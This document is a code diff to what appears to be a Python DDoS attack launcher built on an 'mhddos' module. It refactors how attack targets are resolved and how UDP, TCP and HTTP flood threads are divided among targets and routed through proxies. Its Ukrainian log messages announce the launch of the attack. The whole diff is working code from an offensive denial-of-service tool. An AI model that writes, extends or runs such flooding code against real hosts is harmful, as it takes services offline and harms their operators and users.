@@ -3,7 +3,7 @@ import colorama; colorama.init()
 # @formatter:on
 import queue
 from collections import namedtuple
-from concurrent.futures import Future
+from concurrent.futures import Future, Executor
 from concurrent.futures.thread import _WorkItem
 from threading import Thread, Event
 from time import sleep, time
@@ -12,7 +12,7 @@ from yarl import URL
 
 from src.cli import init_argparse
 from src.core import logger, cl, UDP_THREADS, LOW_RPC, IT_ARMY_CONFIG_URL
-from src.dns_utils import resolve_host, get_resolvable_targets
+from src.dns_utils import resolve_host, resolve_all_targets
 from src.mhddos import main as mhddos_main
 from src.output import AtomicCounter, show_statistic, print_banner, print_progress
 from src.proxies import update_proxies
@@ -27,7 +27,7 @@ PAD_THREADS = 30
 TERMINATE = object()
 
 
-class DaemonThreadPool:
+class DaemonThreadPool(Executor):
     def __init__(self):
         self._queue = queue.SimpleQueue()
 
@@ -70,21 +70,21 @@ def run_ddos(thread_pool, proxies, targets, total_threads, period, rpc, http_met
     threads_per_target = total_threads // len(targets)
     params_list = []
     for target in targets:
-        ip = resolve_host(target)
-        target = URL(target)
+        ip = resolve_host(target.url.host)
         # UDP
-        if target.scheme == 'udp':
-            params_list.append(Params(target, ip, 'UDP', UDP_THREADS))
+        if target.is_udp:
+            params_list.append(Params(target.url, ip, target.method or 'UDP', UDP_THREADS))
 
         # TCP
-        elif target.scheme == 'tcp':
-            params_list.append(Params(target, ip, 'TCP', threads_per_target))
+        elif target.url.scheme == "tcp" or target.method is not None:
+            params_list.append(
+                Params(target.url, ip, target.method or 'TCP', threads_per_target))
 
-        # HTTP(S)
+        # HTTP(S), methods from --http-methods
         else:
             threads = threads_per_target // len(http_methods)
             for method in http_methods:
-                params_list.append(Params(target, ip, method, threads))
+                params_list.append(Params(target.url, ip, method, threads))
 
     logger.info(f'{cl.YELLOW}Запускаємо атаку...{cl.RESET}')
     statistics = {}
@@ -147,12 +147,13 @@ def start(args):
     proxies = []
     while True:
         while True:
-            raw_targets = list(targets_iter)
-            if not raw_targets:
+            targets = list(targets_iter)
+            if not targets:
                 logger.error(f'{cl.RED}Не вказано жодної цілі для атаки{cl.RESET}')
                 exit()
 
-            targets = list(get_resolvable_targets(raw_targets, thread_pool))
+            targets = resolve_all_targets(targets, thread_pool)
+            targets = [target for target in targets if target.is_resolved]
             if targets:
                 break
             else:
@@ -165,7 +166,7 @@ def start(args):
                 f'через збільшення кількості перепідключень{cl.RESET}'
             )
 
-        no_proxies = args.vpn_mode or all(target.lower().startswith('udp://') for target in targets)
+        no_proxies = args.vpn_mode or all(target.is_udp for target in targets)
         if no_proxies:
             proxies = []
         else:
